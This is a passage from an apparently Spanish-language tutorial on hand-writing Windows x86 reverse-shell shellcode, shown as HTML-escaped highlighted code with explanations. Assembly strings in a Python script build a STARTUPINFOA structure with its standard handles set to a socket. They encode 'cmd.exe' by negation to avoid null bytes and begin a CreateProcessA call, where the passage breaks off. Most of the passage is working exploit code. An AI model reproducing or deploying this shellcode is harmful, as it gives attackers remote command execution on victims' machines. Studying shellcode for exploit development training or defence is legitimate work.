z-python&quot;&gt;#&lt;&#x2F;span&gt; Inserta lpReserved2
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;push    eax;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;             &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Inserta cbReserved2 &amp;amp; wShowWindow
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;mov     al, 0x80;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;        &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Mueve 0x80 a AL
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;xor     ecx, ecx;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;        &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Null ECX
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;mov     cx, 0x80;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;        &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Mueve 0x80 a CX
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;add     eax, ecx;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;        &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Añade a EAX 0x100
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;push    eax;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;             &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Inserta dwFlags
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;xor     eax, eax;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;        &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Null EAX
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;push    eax;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;             &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Inserta dwFillAttribute
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;push    eax;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;             &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Inserta dwYCountChars
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;push    eax;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;             &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Inserta dwXCountChars
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;push    eax;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;             &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Inserta dwYSize
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;push    eax;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;             &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Inserta dwXSize
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;push    eax;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;             &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Inserta dwY
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;push    eax;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;             &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Inserta dwX
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;push    eax;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;             &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Inserta lpTitle
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;push    eax;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;             &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Inserta lpDesktop
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;push    eax;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;             &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Inserta lpReserved
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;mov     al, 0x44;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;        &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Mueve 0x44 a AL
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;push    eax;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;             &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Inserta cb
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;push    esp;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;             &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Inserta el puntero de la estructura STARTUPINFOA
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;pop     edi;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;             &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Guarda el puntero de STARTUPINFOA en EDI
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Primero, presentamos la función &lt;code&gt;create_startupinfoa&lt;&#x2F;code&gt; , que es responsable de crear &lt;strong&gt;STARTUPINFOA&lt;&#x2F;strong&gt; y obtener un puntero a él para su uso posterior.&lt;&#x2F;p&gt;
&lt;p&gt;A continuación, enviamos el registro ESI, que actualmente contiene nuestro descriptor de socket, a la pila tres veces. Esto establece los miembros &lt;code&gt;hStdInput&lt;&#x2F;code&gt;, &lt;code&gt;hStdOutput&lt;&#x2F;code&gt; y &lt;code&gt;hStdError&lt;&#x2F;code&gt; .&lt;&#x2F;p&gt;
&lt;p&gt;A esta instrucción le sigue la inserción de dos dwords nulos que configuran &lt;code&gt;lpReserved2&lt;&#x2F;code&gt;, &lt;code&gt;cbReserved2&lt;&#x2F;code&gt;, y miembros de &lt;code&gt;wShowWindow&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;Siguiendo la lógica de nuestra función, establecemos los registros AL y CX en &lt;code&gt;0x80&lt;&#x2F;code&gt; y los sumamos, almacenando el resultado en EAX. Este valor se introduce como miembro &lt;code&gt;dwFlags&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;El único otro parámetro que no se establece en nulo es &lt;strong&gt;cb&lt;&#x2F;strong&gt;, que se establece en el tamaño de la estructura (&lt;code&gt;0x44&lt;&#x2F;code&gt;).&lt;&#x2F;p&gt;
&lt;p&gt;Como paso final en la función &lt;code&gt;create_startupinfoa&lt;&#x2F;code&gt; , insertamos el registro ESP, lo que nos proporciona un puntero a la estructura &lt;code&gt;STARTUPINFOA&lt;&#x2F;code&gt; en la pila. Luego, insertamos ese valor en EDI.&lt;&#x2F;p&gt;
&lt;p&gt;El siguiente paso es almacenar la cadena &quot;&lt;code&gt;cmd.exe&lt;&#x2F;code&gt;&quot; y obtener un puntero a ella:&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;&amp;quot;create_cmd_string:&amp;quot;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    &amp;quot;mov    eax, 0xff9a879b;&amp;quot;     # Mueve 0xff9a879b a EAX
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    &amp;quot;neg    eax;&amp;quot;                 # Niega EAX, EAX = 00657865
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    &amp;quot;push   eax;&amp;quot;                 # Inserta una parte de la cadena &amp;quot;cmd.exe&amp;quot;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    &amp;quot;push   0x2e646d63;&amp;quot;          # Inserta el resto de la cadena &amp;quot;cmd.exe&amp;quot; 
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    &amp;quot;push   esp;&amp;quot;                 # Inserta el puntero de la cadena &amp;quot;cmd.exe&amp;quot; 
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    &amp;quot;pop    ebx;&amp;quot;                 # Guarda el puntero de la cadena en EBX
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Las instrucciones comienzan moviendo un valor negativo a EAX, que le sigue una instrucción &lt;code&gt;neg&lt;&#x2F;code&gt;, que generará la última parte de la cadena como nulo para evitar bytes nulos. Después se inserta la última parte de la cadena cmd.exe y se guarda en ebx para usarla posteriormente.&lt;&#x2F;p&gt;
&lt;p&gt;Ya tan solo quedaría definir la función &lt;code&gt;call_createprocessa&lt;&#x2F;code&gt;:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; class=&quot;language-python z-code&quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;call_createprocessa:&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-terminator z-statement z-python&quot;&gt;;&lt;&#x2F;span&gt;                 
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;	&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;mov eax, esp;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;                        &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; mueve ESP a EAX
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;	&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;xor ecx, ecx;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;                        &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Null ECX
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;	&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;mov cx, 0x390;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;     &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Mueve 0x390 a CX (tamaño de PROCESS_INFORMATION)
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;	&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;sub eax, ecx;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;      &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Resta CX de EAX to para reservar espacio
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;	&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;push eax;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;                            &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Inserta lpProcessInformation
